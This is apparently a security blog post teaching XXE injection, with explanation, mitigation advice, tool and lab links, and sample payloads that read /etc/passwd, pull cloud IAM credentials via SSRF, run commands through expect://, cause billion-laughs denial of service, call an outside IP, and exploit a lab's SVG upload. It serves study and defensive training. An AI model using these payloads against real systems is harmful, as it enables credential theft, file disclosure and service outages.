---
title: EXternal Xml Entity (XXE)
layout: post
categories: [Web-Vulnerabilities,XXE]
tags: [Vulnerability,XXE]
toc: true
published: true
---
# EXternal Xml Entity (XXE)

| Content             |
| ------------------- |
| 📚 What Is XXE ?    |
| 🤔 Why XXE Happen ? |
| 🧬 XXE Types        |
|  ⚔ Impact           |
| 🔎 How To Find      |
| 🛠 Tools             |
| 📕 Referance        |
| 🔬 Labs             |

## 📚 What Is XXE ?

### What is XML?

XML stands for “Extensible Markup Language”,It is the most common language for storing and transporting data. It is a self-descriptive language. It does not contain any predefined tags like `<p>`, `<img>`, etc. All the tags are user-defined depending upon the data it is representing for example. `<email></email>`, `<message></message>` etc.

You can know more about XML Entities FROM [**HERE**](https://portswigger.net/web-security/xxe/xml-entities) To avoid wasting time.

### Definition of XXE

An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.

![](https://i.imgur.com/p5VvvI9.png)

### What is the Document Type Definition (DTD)?

It describes the structure of the document which contains elements and attributes declarations. The
element declaration contains the allowable set of elements that will be used within the document.
The attribute declaration contains the allowable set of attributes corresponding to each element. 

Syntax: -
```ruby
<!DOCTYPE element DTD identifier
[
 declaration1
 declaration2
 ........
]>
```

![](https://i.imgur.com/LWfPsLH.png)

![](https://i.imgur.com/7NXrCyk.png)

---

## 🤔 Why XXE Happen ?

Some applications use the XML format to transmit data between the browser and the server. Applications that do this virtually always use a standard library or platform API to process the XML data on the server. XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.

---

## 🧬 XXE Types

1. Basic XXE
1. Blind XXE

### Blind XXE

Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

There are two broad ways in which you can find and exploit blind XXE vulnerabilities:

You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
You can trigger XML parsing errors in such a way that the error messages contain sensitive data.

---

## ⚔ Impact

XML External Entity (XXE) can possess a severe threat to a company or a web developer. XXE has always been in Top 10 list of OWASP. It is common as lots of website uses XML in the string and transportation of data and if the countermeasures are not taken then this information will be compromised. Various attacks that are possible are:

* Server-Side Request Forgery (**SSRF**)
```ruby
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
* DoS Attack (**DOS**)

```ruby
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

* Remote Code Execution (**RCE**)

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
  <user>`&xxe;`</user>
  <pass>`mypass`</pass>
</creds>

![](https://i.imgur.com/pKGL3Zz.png)

* Read Files

```ruby
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

* Cross Site Scripting (**XSS**)

```ruby
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```

Content-Type: From JSON to XEE
To change the request you could use a Burp Extension named [**Content Type Converter**](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html). 

Here you can find this example:

```ruby
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
  "firstName": "Avinash",
  "lastName": "",
  "country": "United States",
  "city": "ddd",
  "postalCode": "ddd"
}}}
```

```ruby
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]> 
<root>
 <root>
  <firstName>&xxe;</firstName>
  <lastName/>
  <country>United States</country>
  <city>ddd</city>
  <postalCode>ddd</postalCode>
 </root>
</root>
```

### File Upload
XXE can be performed using the file upload method. We will be demonstrating this using Port Swigger lab “Exploiting XXE via Image Upload”. The payload that we will be using is:

```ruby
<?XML version="1.0" standalone="yes"?>
<!DOCTYPE reset [
<!ENTITY xxe SYSTEM "file:///etc/hostname"> ] >
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="40" x="0" y="100">&xxe;</text>
</svg>
```
Understanding the payload: We will be making an SVG file as only image files are accepted by the upload area. The basic syntax of the SVG file is given above and in that, we have added a text field that will

We will be saving the above code as “payload.svg”. Now on portswigger, we will go on a post and comment and then we will add the made payload in the avatar field.

---

## 🔎 How To Find

Detect any xml data parsing or json and try to inject **XXE**

---

## ⚙ Mitigation 

The best way to avoid XXE vulnerabilities is to
* Completely disable document type definitions (DTDs) in your XML parser. 
* If this is not possible, you must disable external entities and external document type declarations for your parser.
* disable support for `XInclude`

---
## 🛠 Tools
[**xxeftp:**](https://github.com/staaldraad/xxeserv): A mini webserver with FTP support for XXE payloads

[**xxexploiter:**](https://github.com/luisfontes19/xxexploiter): Tool to help exploit XXE vulnerabilities

[**230-OOB:**](https://github.com/lc/230-OOB): An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via http://xxe.sh/

[**XXEinjector:**](https://github.com/enjoiz/XXEinjector): Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods

[**oxml_xxe:**](https://github.com/BuffaloWill/oxml_xxe): A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)

[**docem:**](https://github.com/whitel1st/docem): Utility to embed XXE and XSS payloads in docx,odt,pptx,etc

[**otori:**](http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html): Toolbox intended to allow useful exploitation of XXE vulnerabilities.

---
## 📕 Referance

[**OWASP**](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

[**PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#tools)

[**hacktricks**](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

[**hackingarticles**](https://www.hackingarticles.in/comprehensive-guide-on-xxe-injection/)

[**acunetix**](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/)

[**Portswigger**](https://portswigger.net/web-security/xxe)

[**Portswigger-Xml-Entities**](https://portswigger.net/web-security/xxe/xml-entities)

[**Portswigger-Blind**](https://portswigger.net/web-security/xxe/blind)

[**XXE_Attack_Guide**](http://synradar.com/documents/XXE_Attack_Guide.pdf)

---
## 🔬 Labs

[**Portswigger**](https://portswigger.net/web-security/cross-site-scripting)

[**OWASP Broken Web Applications Project**](https://sourceforge.net/projects/owaspbwa/) Install this Machine and will have a lot of Labs like **DVWA**, **BWAPP** and **Webgoat** etc

Portswigger Labs Solution is [**Here**](https://equatorial-soldier-1bb.notion.site/Port-Swigger-Labs-a0beb4a96b4947e0b4503c334fe7253a)
